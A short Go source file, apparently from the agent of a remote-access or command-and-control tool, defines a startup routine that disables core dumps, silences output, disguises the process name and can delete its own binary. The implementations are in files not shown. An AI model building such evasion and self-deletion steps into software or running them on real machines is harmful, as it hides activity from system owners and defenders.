package agent

// initOpsec applies operational security hardening at startup.
// The individual operations are implemented per-platform in opsec_linux.go,
// opsec_windows.go, and opsec_other.go.
func initOpsec(procName string, selfDelete bool) {
	disableCoreDumps()
	silenceOutput()
	masqueradeProcess(procName)
	if selfDelete {
		selfDeleteBinary()
	}
}
